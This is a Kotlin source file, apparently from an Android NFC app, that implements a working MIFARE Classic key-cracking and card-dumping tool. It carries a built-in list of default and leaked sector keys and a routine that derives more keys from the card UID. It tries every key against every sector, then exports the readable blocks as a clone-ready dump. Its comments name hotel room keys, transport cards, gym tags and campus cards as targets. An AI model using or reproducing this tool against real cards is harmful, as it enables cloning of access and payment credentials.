package com.droid.whaly.nfc

import android.nfc.Tag
import android.nfc.tech.MifareClassic
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow

/**
 * Mifare Classic key recovery and full-card dump.
 *
 * Android does not expose Crypto1, so the nested and darkside attacks are not available
 * from an app. What is available is the real authenticate call, which makes a dictionary
 * attack possible and honest: try every key in the list against every sector, then derive
 * keys from the card UID, then dump whatever opened.
 *
 * The dictionary below is the set that shows up on transport cards, hotel room keys,
 * gym tags, campus cards and the default-configured clones of all of them.
 */
object MifareCracker {

    data class Sector(
        val index: Int,
        val keyA: String?,
        val keyB: String?,
        val blocks: List<String>,
    )

    data class Dump(
        val uid: String,
        val size: Int,
        val sectors: List<Sector>,
        val crackedA: Int,
        val crackedB: Int,
        val at: Long,
    ) {
        val coverage: Int get() = crackedA + crackedB
        val total: Int get() = sectors.size * 2
    }

    private val _dump = MutableStateFlow<Dump?>(null)
    val dump: StateFlow<Dump?> = _dump.asStateFlow()
    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()
    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()
    private val _progress = MutableStateFlow(0)
    val progress: StateFlow<Int> = _progress.asStateFlow()

    /** Default and leaked keys, most productive first. */
    private val baseKeys: List<String> = listOf(
        "FFFFFFFFFFFF",
        "A0A1A2A3A4A5",
        "D3F7D3F7D3F7",
        "000000000000",
        "B0B1B2B3B4B5",
        "4D3A99C351DD",
        "1A982C7E459A",
        "AABBCCDDEEFF",
        "714C5C886E97",
        "587EE5F9350F",
        "A0478CC39091",
        "533CB6C723F6",
        "8FD0A4F256E9",
        "0000014B5C31",
        "BDD41F4B7E5C",
        "16FED58E4A1C",
        "5C8FF9990DA2",
        "D01AFEEB890A",
        "75CCB59C9BED",
        "4B791BEA7BCC",
        "314B49474956",
        "30B1AABBCCDD",
        "484558414354",
        "A64598A77478",
        "26940B21FF5D",
        "FC00018778F7",
        "5E5E5E5E5E5E",
        "1F1F1F1F1F1F",
        "0F0F0F0F0F0F",
        "010203040506",
        "123456789ABC",
        "87654321FEDC",
        "ABCDEF123456",
        "A1B1C1D1E1F1",
        "1A2B3C4D5E6F",
        "4A5A6A7A8A9A",
        "999999999999",
        "A5A5A5A5A5A5",
        "5A5A5A5A5A5A",
        "C0C0C0C0C0C0",
        "EEEEEEEEEEEE",
        "1234567890AB",
        "000000000001",
        "00000000000A",
        "0A0A0A0A0A0A",
        "FFFFFFFF0000",
        "0000FFFFFFFF",
        "C4C4C4C4C4C4",
        "8F8F8F8F8F8F",
    ).distinct()

    fun reset() {
        _dump.value = null
        _log.value = emptyList()
        _progress.value = 0
    }

    /**
     * Runs the whole job against a live tag. Call from a background thread — a full 1K
     * dump with a dictionary this size takes 20 to 60 seconds on a real card.
     */
    fun crack(tag: Tag, onDone: (Dump?) -> Unit) {
        if (_running.value) return
        _running.value = true
        _log.value = emptyList()
        _progress.value = 0
        _dump.value = null

        val classic = MifareClassic.get(tag)
        if (classic == null) {
            append("Not a Mifare Classic tag")
            _running.value = false
            onDone(null)
            return
        }

        try {
            classic.connect()
            val uidBytes = classic.tag.id
            val uid = uidBytes.joinToString("") { "%02X".format(it) }
            val size = classic.size
            val sectorCount = classic.sectorCount
            append("UID $uid · ${sizeLabel(size)} · $sectorCount sectors")

            val keys = (baseKeys + derivedKeys(uidBytes)).distinct()
            append("${keys.size} candidate keys")

            val sectors = mutableListOf<Sector>()
            var crackedA = 0
            var crackedB = 0

            for (sector in 0 until sectorCount) {
                _progress.value = sector
                val firstBlock = classic.sectorToBlock(sector)
                val blockCount = try {
                    classic.getBlockCountInSector(sector)
                } catch (_: Exception) {
                    4
                }
                var keyA: String? = null
                var keyB: String? = null
                var opened = false

                for (key in keys) {
                    if (authenticate(classic, sector, key, keyA = true)) {
                        keyA = key
                        opened = true
                        crackedA++
                        append("sector $sector key A = $key")
                        break
                    }
                }
                if (!opened) {
                    for (key in keys) {
                        if (authenticate(classic, sector, key, keyA = false)) {
                            keyB = key
                            opened = true
                            crackedB++
                            append("sector $sector key B = $key")
                            break
                        }
                    }
                }
                if (keyA != null) {
                    for (key in keys) {
                        if (authenticate(classic, sector, key, keyA = false)) {
                            keyB = key
                            crackedB++
                            append("sector $sector key B = $key")
                            break
                        }
                    }
                }

                val blocks = mutableListOf<String>()
                if (opened) {
                    for (offset in 0 until blockCount) {
                        val blockIndex = firstBlock + offset
                        val data = try {
                            classic.readBlock(blockIndex)
                        } catch (_: Exception) {
                            null
                        }
                        blocks += if (data != null) hex(data) else "access denied"
                    }
                } else {
                    append("sector $sector closed — no key in the list")
                    repeat(blockCount) { blocks += "locked" }
                }

                sectors += Sector(sector, keyA, keyB, blocks)
            }

            val result = Dump(uid, size, sectors, crackedA, crackedB, System.currentTimeMillis())
            _dump.value = result
            append("done — ${result.coverage}/${result.total} keys, ${sectors.sumOf { s -> s.blocks.count { it != "locked" && it != "access denied" } }} blocks read")
            onDone(result)
        } catch (error: Exception) {
            append("card error: ${error.message}")
            onDone(null)
        } finally {
            runCatching { classic.close() }
            _running.value = false
            _progress.value = 0
        }
    }

    private fun authenticate(classic: MifareClassic, sector: Int, key: String, keyA: Boolean): Boolean {
        if (key.length != 12) return false
        return try {
            val bytes = ByteArray(6) { index ->
                key.substring(index * 2, index * 2 + 2).toInt(16).toByte()
            }
            if (keyA) classic.authenticateSectorWithKeyA(sector, bytes)
            else classic.authenticateSectorWithKeyB(sector, bytes)
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Keys that clone tools derive from the UID. Factory and hotel programmers reuse a
     * handful of these, so they crack cards that a plain dictionary misses.
     */
    private fun derivedKeys(uid: ByteArray): List<String> {
        if (uid.size < 4) return emptyList()
        fun b(value: Int) = (value and 0xFF).toByte()
        val u0 = uid[0]
        val u1 = uid[1]
        val u2 = uid[2]
        val u3 = uid[3]
        val bcc = b(u0.toInt() xor u1.toInt() xor u2.toInt() xor u3.toInt())

        val candidates = listOf(
            byteArrayOf(u0, u1, u2, u3, u0, u1),
            byteArrayOf(u0, u1, u2, u3, u2, u3),
            byteArrayOf(u3, u2, u1, u0, u3, u2),
            byteArrayOf(u0, u1, u0, u1, u0, u1),
            byteArrayOf(u2, u3, u2, u3, u2, u3),
            byteArrayOf(bcc, bcc, bcc, bcc, bcc, bcc),
            byteArrayOf(u0, u1, u2, u3, bcc, bcc),
            byteArrayOf(u0, u1, u2, u3, b(u0.toInt().inv()), b(u1.toInt().inv())),
            byteArrayOf(u0, u1, u2, u3, u0, b(u0.toInt().inv())),
            byteArrayOf(b(u0.toInt().inv()), b(u1.toInt().inv()), b(u2.toInt().inv()), b(u3.toInt().inv()), u0, u1),
        )
        return candidates.map { key -> key.joinToString("") { "%02X".format(it) } }
    }

    private fun hex(bytes: ByteArray): String =
        bytes.joinToString("") { "%02X".format(it) }

    private fun sizeLabel(size: Int): String = when (size) {
        MifareClassic.SIZE_MINI -> "Mini 320 B"
        MifareClassic.SIZE_1K -> "1K"
        MifareClassic.SIZE_2K -> "2K"
        MifareClassic.SIZE_4K -> "4K"
        else -> "$size B"
    }

    /** Standard MIFARE dump format, one 16-byte block per line, sector trailers included. */
    fun toMfd(dump: Dump): ByteArray {
        val out = java.io.ByteArrayOutputStream()
        dump.sectors.forEach { sector ->
            sector.blocks.forEach { block ->
                val clean = block.filter { it in "0123456789ABCDEFabcdef" }
                if (clean.length == 32) {
                    out.write(clean.chunked(2).map { it.toInt(16).toByte() }.toByteArray())
                } else {
                    out.write(ByteArray(16))
                }
            }
        }
        return out.toByteArray()
    }

    fun toText(dump: Dump): String = buildString {
        appendLine("Whaly Mifare dump")
        appendLine("UID: ${dump.uid}")
        appendLine("Keys: ${dump.coverage}/${dump.total}")
        appendLine()
        dump.sectors.forEach { sector ->
            appendLine("sector ${sector.index}  A=${sector.keyA ?: "--"}  B=${sector.keyB ?: "--"}")
            sector.blocks.forEachIndexed { offset, block ->
                appendLine("  $offset  $block")
            }
        }
    }

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(200)
    }
}
